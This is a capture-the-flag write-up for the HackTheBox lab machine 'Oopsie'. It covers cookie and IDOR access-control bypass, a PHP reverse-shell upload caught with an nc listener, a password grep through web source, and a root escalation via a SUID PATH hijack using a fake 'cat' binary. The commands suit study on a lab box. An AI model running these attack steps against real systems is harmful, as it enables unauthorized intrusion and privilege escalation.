# Oopsie

## Overview

**Oopsie** — HTB Starting Point (Tier 2), Easy-rated Linux box. Chains a broken access control (IDOR) bug in a web app's cookie-based authorization, an unrestricted file upload leading to a PHP webshell / reverse shell, password reuse via a disclosed config file, and a SUID binary vulnerable to PATH hijacking for root.

## Learning Objectives

- Identify and exploit broken access control via client-controlled cookies (IDOR)
- Use Burp Suite Proxy/Intercept to inspect and modify live requests
- Enumerate directories with Gobuster to confirm an upload path
- Upload and trigger a PHP reverse shell, then upgrade a dumb shell to a full TTY
- Recognize credential/password reuse from a disclosed web app config file
- Enumerate SUID binaries and exploit an insecure (relative-path) command call via `$PATH` hijacking

## Enumeration

```bash
nmap -sV -sC <target-IP>
```
Open ports: 22 (SSH), 80 (HTTP) — an automotive/car-dealership-themed site.

Mapped the site through Burp Suite (browser proxied to `127.0.0.1:8080`, Proxy → Intercept off, browsing normally populates **Target → Site map**), which revealed a hidden login directory under `/cdn-cgi/login/`. The login page offers a "Login as Guest" option — no credentials needed to get an initial low-privilege session.

## Broken Access Control (IDOR via Cookie)

As Guest, inspecting cookies (Firefox/Chrome DevTools → **Application → Storage → Cookies**) showed a `role` cookie (`guest`) and a `user` (uid) cookie tied to the session.

Changing `role` directly in the browser's cookie storage doesn't persist through server-issued redirects — the browser keeps re-sending its own stored (unmodified) cookie on every follow-up request unless the stored value itself is edited. Burp's Intercept only patches a *single* request in flight; redirects that the browser follows afterward revert to the browser's own cookie jar. The reliable fix is editing the cookie value directly in the browser's own storage so it persists across all subsequent requests.

By browsing the account/profile endpoint with an `id` parameter (e.g. `admin.php?content=accounts&id=<n>`) and enumerating that parameter (classic IDOR), it's possible to discover a privileged admin account's `user` id. Setting `role=admin` together with that discovered `user` id grants access to the upload page that's otherwise hidden from guests/regular users.

## Foothold — File Upload → Reverse Shell

The authenticated upload page accepts PHP files directly (no extension/content filtering in this box). Used a standard reverse shell payload (e.g. `php-reverse-shell.php` from `/usr/share/webshells/php/` on Parrot/Kali), edited with the attacker's own VPN `tun0` IP and a listener port.

Confirmed the upload destination directory (`/uploads/`) via the page's own behavior / directory brute-forcing:
```bash
gobuster dir -u http://<target-IP> -w /usr/share/wordlists/dirb/common.txt -x php
```

Set up a listener and triggered the payload by browsing to it directly:
```bash
rlwrap nc -lvnp <port>
```
Visiting `http://<target-IP>/uploads/<payload>.php` in the browser executes the PHP, which connects back and lands a shell as `www-data`.

### Upgrading to a full TTY

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```
Then **Ctrl+Z** to background it, on the attacker terminal:
```bash
stty raw -echo; fg
```
Press Enter twice, then inside the shell:
```bash
export TERM=xterm
```
Gives command history, tab-completion, and working job control (`su`, `Ctrl+C`, etc.) — see `06-Shells/TTY-Upgrade/` in the cheatsheet for the general-purpose version of this technique.

## Lateral Movement — Password Reuse

Reviewing the web app's own source under `/var/www/html/cdn-cgi/login/` turned up a PHP database-connection config file containing hardcoded plaintext database credentials. A classic **password reuse** bug: those same credentials were valid for an actual system account (`robert`), allowing `su robert` directly from the `www-data` shell.

**Takeaway:** always grep web app source for config/connection files after landing a web shell — `grep -ri "password" /var/www/html/ -r`. Hardcoded DB credentials getting reused as real system logins is extremely common.

## Privilege Escalation — SUID PATH Hijacking

As `robert`, checked group memberships (`id` / `groups`) and found membership in a non-standard group: `bugtracker`.

```bash
find / -group bugtracker 2>/dev/null
```
Revealed `/usr/bin/bugtracker`, owned by `root` with the **SUID bit** set (`ls -la` shows `rws` instead of `rwx` on the owner field) — meaning the binary always executes with root's privileges, regardless of which user runs it.

```bash
strings /usr/bin/bugtracker | grep cat
```
Confirmed the binary internally calls `cat` **without an absolute path**. Since command resolution for a bare command name goes through the `$PATH` environment variable (searched in order), and `$PATH` is inherited from the invoking shell (not sanitized by this binary), it's possible to hijack which `cat` actually runs:

```bash
cd /tmp
echo '/bin/bash' > cat
chmod +x cat
export PATH=/tmp:$PATH
/usr/bin/bugtracker
```
`/tmp` is now searched *before* the real `/bin/cat`, so the SUID process (still running as root) executes the attacker's fake `cat` — which just spawns `/bin/bash` — inheriting root's privileges. Result: root shell.

See `07-Privilege-Escalation/SUID-PATH-Hijacking.txt` in the cheatsheet for the technique generalized beyond this specific box.

## Skills Practiced

- Burp Suite Proxy/Intercept workflow, browser proxy configuration
- Cookie-based broken access control exploitation (IDOR)
- Directory enumeration with Gobuster
- PHP reverse shell deployment and listener setup
- Dumb-shell → full TTY upgrade (`pty.spawn` / `stty raw -echo`)
- Source code review for credential disclosure, password reuse
- SUID binary enumeration and `$PATH` hijacking privilege escalation

## Key Takeaways

- Client-controlled cookies deciding authorization server-side is a critical, very common vuln class (IDOR/broken access control) — never trust client-supplied role/permission values
- A single intercepted-and-forwarded request in Burp does not persist a cookie change across subsequent browser-driven redirects; edit the browser's own stored cookie for anything that needs to survive a redirect
- Any SUID binary calling external commands without an absolute path is a PATH hijacking candidate — always check with `strings`/`ltrace` before assuming a SUID binary is safe
- Web app config/connection files are a prime target after getting any shell — credentials there are frequently reused for real system accounts
